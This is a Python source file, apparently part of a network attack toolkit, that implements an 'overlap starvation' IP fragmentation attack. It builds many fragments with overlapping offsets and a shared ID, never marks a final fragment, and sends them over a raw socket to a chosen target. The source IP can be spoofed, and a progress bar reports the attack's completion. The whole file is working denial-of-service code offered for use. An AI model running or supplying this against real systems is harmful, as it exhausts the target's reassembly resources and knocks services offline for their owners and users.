#Overlap Starvation Attack Function:

#Import Libraries:
import socket
import random
import time
import sys

#Import Functions:
from helper_functs.attackParamClass import attackParamClass
from helper_functs.rawsocket import rawSockGen
from helper_functs.ipFormCheck import ipFormCheck
from helper_functs.ipHeadFieldGen import ipHeadFieldGen


def overlapStarvationAttackParam(srcIP, dstIP):

    #Check if IP address have correct form:
    isSrcIpValid=ipFormCheck(srcIP)
    isDestIpValid=ipFormCheck(dstIP)

    if (isSrcIpValid==False)or(isDestIpValid==False):
        if (isSrcIpValid==False)and(isDestIpValid==False):
            print("! Error: Both Source and Destination IP addresses have the wrong form. Please re-enter them and try again!") 
        elif (isSrcIpValid==False):
           print("! Error: Source IP address has the wrong form. Please re-enter it and try again!") 
        else:
            print("! Error: Destination IP address has the wrong form. Please re-enter it and try again!")

        sys.exit(1) 

    overlapFragsNum=input("How many fragments to send? [default 1500]: ").strip()
    print("\n")
    if (overlapFragsNum==""):
        overlapFragsNum=1500
    else:
        overlapFragsNum=int(overlapFragsNum)

    #Generate a random Identification Field for the IP packet:
    IDField=random.randint(0, 65535)

    #Define the Time-to-Live (TTL) field and protocol in use:
    TTL=64 #set to 64 to match the default TTL in Kali Linux (attacker machine)
    protoField=socket.IPPROTO_UDP #set to UDP for connectionless sending


    allOverlapFragms=[]

    #Build each fragment and store it in fragments list:
    for i in range(overlapFragsNum):
        
        overlapFragOffset=random.randrange(0,32,8)
        overlapfragSize=random.randint(8,32)

        overlapfragPayload=bytes(random.randrange(65,91) for _ in range(overlapfragSize))

        allOverlapFragms.append({
                "overlapFragSize":overlapfragSize,
                "overlapFragOffset":overlapFragOffset, 
                "overlapFragPayload":overlapfragPayload,
                })

    return attackParamClass(srcIP,dstIP,IDField,TTL,protoField,0,allOverlapFragms)

def overlapStarvationAttack(attackParams):
    rawSock=rawSockGen()

    totalFrags=len(attackParams.allFragms)
    begin=time.time()
    for i in range(totalFrags): #For each fragment, build the IP header add the pre-built payload and send it to the target destination address
        frag=attackParams.allFragms[i]

        isLastFrag=False
    
        ipHeadPacket=ipHeadFieldGen(attackParams.srcIPAddr,attackParams.destIPAddr,attackParams.IDField,attackParams.TTL,attackParams.protoField,frag["overlapFragSize"],frag["overlapFragOffset"],isLastFrag)

        ipPacket=ipHeadPacket+frag["overlapFragPayload"]
        rawSock.sendto(ipPacket, (attackParams.destIPAddr,0))
        time.sleep(0.01)

        #Progress bar:
        sentSoFar=i+1
        percentDone=int((sentSoFar/totalFrags)*100)
        barLength=30
        filledLength=(barLength*sentSoFar)//totalFrags
        bar="#"*filledLength+"-"*(barLength-filledLength)
        sys.stdout.write(f"\r[{bar}] {percentDone}% ({sentSoFar}/{totalFrags})")
        sys.stdout.flush()
    print("\n")

    end=time.time()
    dur=end-begin

    print(f"=> Elapsed time: {dur:.1f}s  ({totalFrags/dur:.1f} packets/sec)")
    print(f"=> {totalFrags} starvation fragments sent with ID={attackParams.IDField}. Attack Completed!")
    